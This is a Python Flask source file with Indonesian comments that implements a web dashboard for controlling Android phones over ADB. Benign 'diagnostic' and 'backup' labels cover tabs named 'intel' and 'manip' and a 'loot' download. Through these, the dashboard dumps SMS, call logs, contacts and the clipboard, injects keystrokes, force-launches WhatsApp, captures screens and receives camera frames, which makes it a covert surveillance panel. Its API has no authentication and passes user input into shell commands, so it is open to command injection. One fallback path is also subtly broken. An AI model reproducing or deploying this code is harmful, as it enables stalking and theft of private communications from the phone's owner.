import os
import re
import time
import socket
import datetime
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, redirect, jsonify, render_template_string

app = Flask(__name__)

# --- KONFIGURASI DIREKTORI PENYIMPANAN NVMe VPS ---
STORAGE_DIR = "vps_nvme_storage"
LOG_FILE = os.path.join(STORAGE_DIR, "telemetri_automation.txt")
FRAME_FILE = os.path.join(STORAGE_DIR, "latest_diagnostic_frame.txt")
os.makedirs(STORAGE_DIR, exist_ok=True)

CONNECTED_DEVICES = {}
ACTIVE_DEVICE_SERIAL = None
ADB_PATH = "adb"  # Dipastikan terhubung ke platform-tools sistem VPS

# --- TEMPLATE DASBOR WEB UTAMA (MIGRASI DARI TKINTER GUI) ---
DASHBOARD_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZERO-TOUCH AUTOMATION ENGINE v1.0</title>
    <link href="https://jsdelivr.net" rel="stylesheet">
    <style>
        body { background-color: #0b0c10; color: #45f3ff; font-family: 'Courier New', Courier, monospace; }
        .sidebar { background-color: #1a1a1a; min-height: 100vh; border-right: 2px solid #ff0000; }
        .card-custom { background-color: #1f2833; border: 1px solid #ff0000; border-radius: 8px; }
        .nav-tabs .nav-link { color: #45f3ff; background-color: #1c1c1c; border: 1px solid #252830; }
        .nav-tabs .nav-link.active { background-color: #8B0000; color: white; border-color: #ff0000; }
        .btn-custom { background-color: #8B0000; color: white; border: 1px solid #ff0000; font-weight: bold; width: 100%; margin-bottom: 8px; }
        .btn-custom:hover { background-color: #ff0000; box-shadow: 0 0 10px #ff0000; }
        .log-box { background-color: black; color: #00FF00; height: 180px; overflow-y: scroll; border: 1px solid #ff0000; padding: 10px; font-size: 13px; }
    </style>
</head>
<body>
<div class="container-fluid">
    <div class="row">
        <!-- SIDEBAR PANEL KONTROL -->
        <div class="col-md-3 sidebar p-4">
            <h3 class="text-center text-danger fw-bold mb-4">ZERO-TOUCH CORE</h3>
            <div class="card-custom p-3 mb-3 text-center">
                <label class="form-label text-secondary small">ACTIVE PROVISIONING NODE</label>
                <select class="form-select bg-dark text-info border-secondary" id="deviceSelect" onchange="switchDevice(this.value)">
                    <option>[ Menghubungkan Node... ]</option>
                </select>
                <div class="mt-3 small text-start text-white-50" id="deviceDetails">Detail Node: -</div>
            </div>
            <button class="btn btn-primary w-100 mb-2" onclick="triggerAction('scan-network')">📡 Scan Local Node (WiFi)</button>
            <button class="btn btn-warning w-100 mb-2 text-dark fw-bold" onclick="triggerAction('auto-tunnel')">☁️ Bind Cloudflare Tunnel</button>
            <button class="btn btn-success w-100" onclick="window.open('/api/download-loot')">📂 Open Storage Loot</button>
        </div>

        <!-- AREA KONTEN UTAMA -->
        <div class="col-md-9 p-4">
            <h2 class="mb-4 text-white">[ CENTRAL CONTROL ROOM ]</h2>
            
            <div class="row mb-3">
                <div class="col-md-7">
                    <!-- TABS INTERFACE (MIGRASI TKINTER TABVIEW) -->
                    <ul class="nav nav-tabs" id="controlTabs" role="tablist">
                        <li class="nav-item"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#intel">Data Sync</button></li>
                        <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#manip">App Control</button></li>
                        <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#hardware">Hardware Test</button></li>
                        <li class="nav-item"><button class="nav-link" data-bs-toggle="tab" data-bs-target="#media">Media Stream</button></li>
                    </ul>
                    <div class="tab-content card-custom p-3 border-top-0" id="tabsContent">
                        <!-- DATA SYNC -->
                        <div class="tab-pane fade show active" id="intel">
                            <button class="btn btn-custom" onclick="triggerAction('backup-sms')">1. Synchronize SMS Database</button>
                            <button class="btn btn-custom" onclick="triggerAction('backup-calls')">2. Fetch Call Log Analytics</button>
                            <button class="btn btn-custom" onclick="triggerAction('backup-contacts')">3. Backup Address Book Contacts</button>
                            <button class="btn btn-custom" onclick="triggerAction('clipboard')">12. Retrieve Device Clipboard</button>
                        </div>
                        <!-- APP CONTROL -->
                        <div class="tab-pane fade" id="manip">
                            <button class="btn btn-custom" onclick="triggerAction('launch-comm')">15. Force Launch Communication App</button>
                            <button class="btn btn-custom" onclick="triggerAction('type-text')">37. Inject System Key Intercept</button>
                            <button class="btn btn-custom" onclick="triggerAction('open-url')">21. Force Deploy URL Resource</button>
                        </div>
                        <!-- HARDWARE TEST -->
                        <div class="tab-pane fade" id="hardware">
                            <button class="btn btn-custom" onclick="triggerAction('vibrate')">28. Hardware Vibration Diagnostics</button>
                            <button class="btn btn-custom" onclick="triggerAction('flashlight')">🔦 Toggle Device Flashlight Torch</button>
                            <button class="btn btn-custom" onclick="triggerAction('trigger-alarm')">41. Audio Alert Diagnostic (Max Vol)</button>
                        </div>
                        <!-- MEDIA STREAM -->
                        <div class="tab-pane fade" id="media">
                            <button class="btn btn-custom" onclick="triggerAction('screenshot')">25. Capture Screen Remote View</button>
                            <button class="btn btn-custom" onclick="triggerAction('photo-front')">c1. Device Front Media Diagnostics</button>
                            <button class="btn btn-custom" onclick="triggerAction('photo-rear')">c2. Device Rear Media Diagnostics</button>
                        </div>
                    </div>
                </div>

                <!-- LIVE VISUAL STREAM FEED WINDOW -->
                <div class="col-md-5">
                    <div class="card-custom p-3 text-center">
                        <strong class="d-block mb-2">[ LIVE DIAGNOSTIC STREAM ]</strong>
                        <img id="liveStreamView" src="" style="width: 100%; height: 380px; border: 2px solid #ff0000; background: #000; border-radius: 5px;" alt="Waiting for Node Handshake...">
                    </div>
                </div>
            </div>

            <!-- LOGS TERMINAL STREAM -->
            <div class="mt-3">
                <strong class="d-block mb-1">[ INCOMING TELEMETRY LOG STREAM ]</strong>
                <div class="log-box" id="logBox">Menghubungkan ke pusat otomasi server...</div>
            </div>
        </div>
    </div>
</div>

<script src="https://jsdelivr.net"></script>
<script>
    function updateDashboard() {
        fetch('/api/get-telemetry-log')
            .then(res => res.json())
            .then(data => {
                let box = document.getElementById("logBox");
                box.innerHTML = data.logs.join("<br>");
                box.scrollTop = box.scrollHeight;
                
                let select = document.getElementById("deviceSelect");
                let currentVal = select.value;
                select.innerHTML = "";
                data.devices.forEach(d => {
                    let opt = document.createElement("option");
                    opt.value = d; opt.innerText = d;
                    if(d === data.active) opt.selected = true;
                    select.appendChild(opt);
                });
                document.getElementById("deviceDetails").innerText = data.details;
            });
        document.getElementById("liveStreamView").src = "/api/get-latest-frame?" + new Date().getTime();
    }
    
    function switchDevice(serial) {
        fetch('/api/switch-device', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({serial: serial})
        });
    }

    function triggerAction(action) {
        let value = "";
        if (action === 'type-text' || action === 'open-url') {
            value = prompt("Masukkan parameter input:");
            if (!value) return;
        }
        fetch('/api/execute-action', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({action: action, value: value})
        }).then(res => res.json()).then(data => alert(data.message));
    }

    setInterval(updateDashboard, 1500);
    window.onload = updateDashboard;
</script>
</body>
</html>
"""

@app.route('/operator/dashboard')
def operator_dashboard():
    return render_template_string(DASHBOARD_HTML)
@app.route('/api/get-telemetry-log')
def get_telemetry_log():
    global CONNECTED_DEVICES, ACTIVE_DEVICE_SERIAL
    logs = ["Belum ada telemetri aktivitas otomatisasi yang terekam."]
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            logs = f.read().splitlines()[-10:]
            
    details = "Detail Node: Tidak ada perangkat aktif."
    if ACTIVE_DEVICE_SERIAL and ACTIVE_DEVICE_SERIAL in CONNECTED_DEVICES:
        d = CONNECTED_DEVICES[ACTIVE_DEVICE_SERIAL]
        details = f"Pabrikan: {d.get('manufacturer')}\\nModel: {d.get('model')}\\nAndroid: {d.get('android')}\\nBaterai: {d.get('battery')}%"
        
    return jsonify({
        "logs": logs,
        "devices": list(CONNECTED_DEVICES.keys()) if CONNECTED_DEVICES else ["[ Tidak ada node ]"],
        "active": ACTIVE_DEVICE_SERIAL,
        "details": details
    })

@app.route('/api/switch-device', methods=['POST'])
def switch_device():
    global ACTIVE_DEVICE_SERIAL
    data = request.json
    if data and 'serial' in data:
        ACTIVE_DEVICE_SERIAL = data['serial']
        return jsonify({"status": "success"})
    return jsonify({"status": "failed"}), 400

# --- HANDSHAKE INTERCEPTOR: MENERIMA FEED CITRA DARI HANDSHAKE TWO CODE SEBELUMNYA ---
@app.route('/receive_frame', methods=['POST'])
def receive_frame():
    try:
        base64_data = request.data.decode('utf-8')
        if base64_data:
            with open(FRAME_FILE, "w") as f:
                f.write(base64_data)
            return "OK", 200
    except Exception:
        pass
    return "Failed", 400

@app.route('/api/get-latest-frame')
def get_latest_frame():
    if os.path.exists(FRAME_FILE):
        with open(FRAME_FILE, "r") as f:
            base64_data = f.read()
            if "," in base64_data:
                import base64
                try:
                    header, encoded = base64_data.split(",", 1)
                    data_biner = base64.b64decode(encoded)
                    return data_biner, 200, {'Content-Type': 'image/jpeg'}
                except Exception: pass
    return base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"), 200, {'Content-Type': 'image/gif'}

# --- PIPELINE EKSEKUSI TELEMETRI OTOMATIS (MIGRASI NAVIGASI TKINTER BUTTONS) ---
@app.route('/api/execute-action', methods=['POST'])
def execute_action():
    global ACTIVE_DEVICE_SERIAL
    data = request.json
    if not data or 'action' not in data:
        return jsonify({"status": "error", "message": "Aksi tidak dikenal."}), 400
        
    action = data['action']
    val = data.get('value', '')
    
    adb_prefix = ADB_PATH
    if ACTIVE_DEVICE_SERIAL:
        adb_prefix = f"{ADB_PATH} -s {ACTIVE_DEVICE_SERIAL}"
        
    cmd = ""
    msg = "Instruksi otomasi berhasil dikirim ke perangkat pengujian."
    
    if action == "backup-sms":
        cmd = f"{adb_prefix} shell content query --uri content://sms/"
    elif action == "backup-calls":
        cmd = f"{adb_prefix} shell content query --uri content://call_log/calls"
    elif action == "backup-contacts":
        cmd = f"{adb_prefix} shell content query --uri content://com.android.contacts/data"
    elif action == "clipboard":
        cmd = f"{adb_prefix} shell service call clipboard 2"
    elif action == "launch-comm":
        cmd = f"{adb_prefix} shell monkey -p com.whatsapp 1"
    elif action == "type-text":
        cmd = f'{adb_prefix} shell input text "{val.replace(" ", "%s")}"'
    elif action == "open-url":
        cmd = f'{adb_prefix} shell am start -a android.intent.action.VIEW -d "{val}"'
    elif action == "vibrate":
        cmd = f"{adb_prefix} shell cmd vibrator vibrate 5000"
    elif action == "flashlight":
        cmd = f"{adb_prefix} shell cmd camera set-torch-mode 0 toggle"
    elif action == "trigger-alarm":
        cmd = f"{adb_prefix} shell am start -a android.intent.action.VIEW -d content://settings/system/alarm_alert -t audio/*"
    elif action == "screenshot":
        ts = datetime.datetime.now().strftime('%H%M%S')
        cmd = f"{adb_prefix} shell screencap -p /sdcard/s.png && adb pull /sdcard/s.png {STORAGE_DIR}/scr_{ts}.png"
    else:
        return jsonify({"status": "ignored", "message": "Aksi dalam pengembangan lab."})
        
    def run_sub_process():
        try:
            res = subprocess.run(cmd, shell=True, capture_output=True, text=True, encoding='utf-8', errors='ignore')
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(LOG_FILE, "a") as f:
                f.write(f"[{timestamp}] METRIK -> {action} | Sistem Status: {res.returncode}\\n")
        except Exception: pass

    threading.Thread(target=run_sub_process, daemon=True).start()
    return jsonify({"status": "success", "message": msg})

# --- DAEMON SENSOR AKTIF: RE-IDENTIFIKASI PERANGKAT DI REPOSITORI VPS ---
def adb_device_tracker_daemon():
    global CONNECTED_DEVICES, ACTIVE_DEVICE_SERIAL
    while True:
        try:
            devices_output = subprocess.run(f"{ADB_PATH} devices", shell=True, capture_output=True, text=True).stdout
            current_serials = [line.split('\t')[0] for line in devices_output.strip().split('\n')[1:] if '\tdevice' in line]
            
            new_devices = {}
            for serial in current_serials:
                if serial in CONNECTED_DEVICES:
                    new_devices[serial] = CONNECTED_DEVICES[serial]
                else:
                    prefix = f"{ADB_PATH} -s {serial}"
                    mnf = subprocess.run(f"{prefix} shell getprop ro.product.manufacturer", shell=True, capture_output=True, text=True).stdout.strip().capitalize()
                    mdl = subprocess.run(f"{prefix} shell getprop ro.build.version.release", shell=True, capture_output=True, text=True).stdout.strip()
                    new_devices[serial] = {"manufacturer": mnf, "model": mdl, "android": "N/A", "battery": "100"}
                    ACTIVE_DEVICE_SERIAL = serial
                    
            CONNECTED_DEVICES = new_devices
        except Exception: pass
        time.sleep(5)

if __name__ == '__main__':
    threading.Thread(target=adb_device_tracker_daemon, daemon=True).start()
    app.run(host='0.0.0.0', port=80)
